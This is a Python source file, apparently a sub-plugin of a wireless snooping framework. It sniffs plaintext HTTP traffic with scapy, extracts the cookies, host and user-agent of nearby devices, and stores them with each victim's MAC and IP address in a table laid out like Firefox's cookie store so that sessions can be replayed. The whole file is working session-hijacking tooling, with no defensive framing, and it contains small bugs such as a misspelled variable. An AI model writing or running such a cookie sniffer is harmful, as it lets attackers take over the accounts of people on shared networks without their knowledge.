#!/usr/bin/env python
# -*- coding: utf-8 -*-

import logging
import re
from sqlalchemy import MetaData, Table, Column, Integer, String, Unicode
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import Dot11ProbeReq, Dot11Elt, TCP, IP, Raw, Ether, RadioTap
from base64 import b64encode
from includes.common import snoop_hash
from collections import OrderedDict

import time
from publicsuffix import PublicSuffixList
from urlparse import urlparse
import includes.firelamb_helper as helper
from includes.fonts import *
import os

MAX_NUM_SSIDs = 1000 #Maximum number of mac:ssid pairs to keep in memory

class Snarf():
    """Extract web cookies"""

    def __init__(self, **kwargs):
        self.drone = kwargs.get('drone',"no_drone_name_supplied")
        self.verb = kwargs.get('verbose', 0)
        self.fname = os.path.splitext(os.path.basename(os.path.basename(__file__)))[0]
        self.device_ssids = OrderedDict()
        self.psl = PublicSuffixList()


    @staticmethod
    def get_tables():
        """Make sure to define your table here"""
        table = Table('cookies', MetaData(),
                        Column('drone', String(20),primary_key=True),
                        Column('client_mac', String(15),primary_key=True),
                        Column('client_ip', String(16),primary_key=True),
                        #Following columns are as defined by Firefox
                        Column('baseDomain', String(100), primary_key=True, autoincrement=False),
                        Column('name', String(100), primary_key=True, autoincrement=False),
                        Column('value', String(100)),
                        Column('host', String(100)),
                        Column('path', String(100), default="/"),
                        Column('expiry', Integer, default=2000000000), #Year 2030
                        Column('lastAccessed', Integer),
                        Column('creationTime', Integer),
                        Column('isSecure', Integer, default=0),
                        Column('isHttpOnly', Integer, default=0),
                        Column('sunc', Integer, default=0))
        return [table]

    def proc_packet(self, pkt):
        if pkt.haslayer(TCP) and pkt.haslayer(IP):
            if pkt.haslayer(Raw):
                tcpdata = pkt.getlayer(Raw).load
                if tcpdata.startswith("POST ") or tcpdata.startswith("GET "):
                    if pkt.getlayer(RadioTap):
                        ether_src = pkt.addr2
                    if pkt.getlayer(Ether):
                        ether_src=pkt.getlayer(Ether).src
                    ether_src = re.sub(':', '', ether_src)

                    cookie=helper.getcookie(tcpdata)
                    host=helper.gethost(tcpdata)
                    useragent=helper.getuseragent(tcpdata)
                    address=helper.getdsturl(tcpdata)
                    ip_src=pkt.getlayer(IP).src

                    if cookie != None:
                        cookie=''.join(cookie)
                    else:
                        cookie=''
                    if host != None:
                        host=''.join(host)
                    else:
                        host=''
                    if useragent != None:
                        useragent=''.join(useragent)
                    else:
                        useragnet=''

                    if address != None:
                        address=''.join(address)
                    else:
                        address=''

                    if cookie != '':
                        cookies = cookie.split(';')
                        for name_val in cookies:
                            eq = name_val.find('=')
                            name = name_val[0:eq].strip()
                            val = name_val[eq+1:].strip()
                            self.device_ssids[(ether_src,ip_src,host,name,val,address,useragent,ip_src)] = 0
                            if self.verb > 0:
                                logging.info("Sub-plugin %s%s%s observed cookie for domain %s%s (%s)%s" % (GR,self.fname,G,GR,host,ether_src,G))

    def get_data(self):

        tmp = []
        mark = []
        now = int(time.time())-600
        for k, v in self.device_ssids.iteritems():
            if v == 0:
                mac,ip_src,host,name,value,address,ua,ip = k
                basedomain = self.psl.get_public_suffix(host)
                address=urlparse(address).hostname
                if address == basedomain:
                    address = "." + address

                tmp.append( {"drone": self.drone, "client_mac": mac, "client_ip":ip_src, "host": host, "name": name, "value": value, "baseDomain" : basedomain, "address": address, "lastAccessed":now, "creationTime":now } )
                mark.append(k[:4])

        # Reduce mac:ssid data structure if it's getting too large
        if len(self.device_ssids) > MAX_NUM_SSIDs:
            logging.debug("MAC:SSID structure is large (%d), going to reduce by 50pc (-%d)" % (len(self.device_ssids),(int(0.5*MAX_NUM_SSIDs))))
            for i in range(int(0.5 * MAX_NUM_SSIDs)):
                try:
                    self.device_ssids.popitem(last = False)
                except KeyError:
                    pass
            logging.debug("MAC:SSID structure is now %d" % len(self.device_ssids))

        if len(mark) > 0:
            for foo in mark:
                mac, ssid = foo[0], foo[1]
                self.device_ssids[(mac, ssid)] = 1
            return ("cookies", tmp)
